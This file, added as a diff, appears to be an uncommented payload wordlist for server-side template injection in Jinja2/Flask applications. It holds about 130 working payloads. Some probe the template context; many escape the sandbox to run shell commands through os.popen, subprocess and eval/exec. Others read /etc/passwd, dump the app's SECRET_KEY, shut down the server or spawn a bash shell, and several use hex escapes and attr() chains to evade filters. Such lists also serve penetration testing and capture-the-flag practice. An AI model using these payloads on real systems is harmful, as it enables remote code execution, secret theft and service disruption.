@@ -1,0 +1,132 @@
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{self}}
+{{request}}
+{{g}}
+{{''.__class__}}
+{{[].__class__}}
+{{{}.__class__}}
+{{''.join}}
+{{config.items()}}
+{{self.__dict__}}
+{{request.environ}}
+{{request.application}}
+{{get_flashed_messages.__globals__}}
+{{lipsum.__globals__}}
+{{cycler.__init__.__globals__}}
+{{joiner.__init__.__globals__}}
+{{namespace.__init__.__globals__}}
+{{''.__class__.__mro__}}
+{{[].__class__.__mro__}}
+{{{}.__class__.__mro__}}
+{{''.__class__.__mro__[1]}}
+{{''.__class__.__mro__[2]}}
+{{[].__class__.__base__}}
+{{{}.__class__.__base__}}
+{{''.__class__.__base__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{[].__class__.__base__.__subclasses__()}}
+{{{}.__class__.__base__.__subclasses__()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{{c.__name__}},{%endfor%}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request.__class__.__mro__[1].__subclasses__()}}
+{{request.__class__.__mro__[8].__subclasses__()}}
+{{request.__class__.__mro__[9].__subclasses__()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}}
+{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
+{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{[].__class__.__base__.__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{[].__class__.__base__.__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}
+{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.environ['werkzeug.server.shutdown']()}}
+{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
+{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
+{{url_for.__globals__['__builtins__']['exec']("__import__('os').popen('id').read()")}}
+{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{url_for.__globals__['current_app'].config['SECRET_KEY']}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].__import__('os').popen('id').read()}}{%endif%}{%endfor%}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='_wrap_close'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Popen'%}{{c('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('ls -la',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('uname -a',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('pwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('env',shell=True,stdout=-1).communicate()[0].strip()}}
+{%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f'))}
+{%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')())%}
+{%print(cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')())%}
+{%set chr=lipsum.__globals__.__builtins__.chr%}{{lipsum.__globals__[chr(111)%2bchr(115)].popen('id').read()}}
+{%set chr=lipsum.__globals__.__builtins__.chr%}{%set cmd=chr(105)%2bchr(100)%}{{lipsum.__globals__.os.popen(cmd).read()}}
+{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}
+{{cycler|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}
+{{joiner|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}
+{{namespace|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}
+{{request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("id")|attr("read")()}}
+{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(396)('id',shell=True,stdout=-1)|attr('communicate')()|attr('__getitem__')(0)|attr('strip')()}}
+{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
+{{self|attr('_TemplateReference__context')|attr('cycler')|attr('__init__')|attr('__globals__')|attr('os')|attr('popen')('id')|attr('read')()}}
+{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{lipsum['\x5f\x5fglobals\x5f\x5f']['os'].popen('id').read()}}
+{{cycler['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['os'].popen('id').read()}}
+{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os').popen('id').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "Popen" in x.__name__ %}{{x('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}
+{%with a=request|attr("application")%}{%with b=a|attr("__globals__")%}{%with c=b|attr("__getitem__")%}{%with d=c("__builtins__")%}{%with e=d|attr("__getitem__")%}{%with f=e("__import__")%}{%with g=f("os")%}{%with h=g|attr("popen")%}{%with i=h("id")%}{%with j=i|attr("read")%}{{j()}}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}
+{%set x=lipsum|attr("\x5f\x5fglobals\x5f\x5f")%}{%set y=x|attr("\x5f\x5fgetitem\x5f\x5f")%}{%set z=y("os")%}{%set a=z|attr("popen")%}{%set b=a("id")%}{%set c=b|attr("read")%}{{c()}}
+{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+{{().__class__.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{"".__class__.__bases__[0].__subclasses__()[40]("/etc/passwd").read()}}
+{{"".__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{dict.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
+{{dict.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+{{dict.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{dict.__bases__[0].__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{dict.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{%print(''.__class__.__mro__[1].__subclasses__())%}
+{%print(lipsum.__globals__)%}
+{%print(cycler.__init__.__globals__)%}
+{%print(request.environ)%}
+{%print(config.items())%}
+{{x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}
+{{lipsum.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}
+{{lipsum.__globals__['__builtins__']['exec']('import os;os.popen("id").read()')}}
+{{lipsum.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
+{{lipsum.__globals__.__builtins__.exec('import os;print(os.popen("id").read())')}}
+{{cycler.__init__.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
+{{cycler.__init__.__globals__.__builtins__.exec('import os;print(os.popen("id").read())')}}
+{{joiner.__init__.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
+{{namespace.__init__.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
+{%import os%}{{os.popen('id').read()}}
+{%import subprocess%}{{subprocess.check_output('id',shell=True)}}
+{%import pty%}{{pty.spawn('/bin/bash')}}
+{{''.__class__.__mro__[1].__subclasses__()[396].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[230].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{request.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{self.__dict__._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{self.__dict__._TemplateReference__context.lipsum.__globals__.os.popen('id').read()}}
+{{self.__dict__._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}}
+{{self.__dict__._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}
